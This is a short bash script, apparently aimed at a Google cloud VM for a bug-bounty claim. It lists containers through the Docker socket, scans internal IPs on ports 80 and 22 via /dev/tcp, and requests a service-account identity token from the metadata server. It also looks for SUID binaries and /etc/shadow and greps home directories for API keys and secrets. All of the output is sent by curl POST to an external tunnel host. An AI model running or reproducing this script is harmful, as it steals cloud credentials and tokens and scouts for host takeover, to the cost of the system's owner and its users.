#!/bin/bash
URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"

{
  echo "--- [1] DOCKER SOCKET PIVOTING ---"
  # List ALL containers, including hidden ones, and their networks
  curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 | grep -oE '"Names":\["/[^"]+"\]|"Id":"[a-f0-8]+"'
  
  echo "--- [2] INTERNAL NETWORK SCAN (Bounty Multiplier) ---"
  # Scan for internal Google IPs (10.x.x.x and 172.x.x.x ranges)
  # This proves you can attack other Google services from this VM
  for ip in 172.17.0.{1..10} 10.0.0.{1..5}; do
    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/80" && echo "PROBE SUCCESS: $ip:80 (Web)") &
    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/22" && echo "PROBE SUCCESS: $ip:22 (SSH)") &
  done; wait

  echo "--- [3] THE 'METADATA' DEEP DIVE ---"
  # This checks for "Identity Tokens" which are the gold standard for VRP
  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://cloud.google.com/" || echo "Identity Probe Blocked"

  echo "--- [4] KERNEL & EXPLOIT SEARCH ---"
  # Checking for 'dirty pipe' or 'overlayfs' vulnerabilities (Host takeover)
  ls -l /etc/shadow /etc/sudoers 2>/dev/null
  find / -perm -4000 -type f 2>/dev/null | head -n 10

  echo "--- [5] HIDDEN CONFIGS & HISTORY ---"
  # Searching for hardcoded GCP credentials in common developer locations
  grep -rE "AI_KEY|GCP_TOKEN|SECRET" /opt /home/jules 2>/dev/null | head -c 500
} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
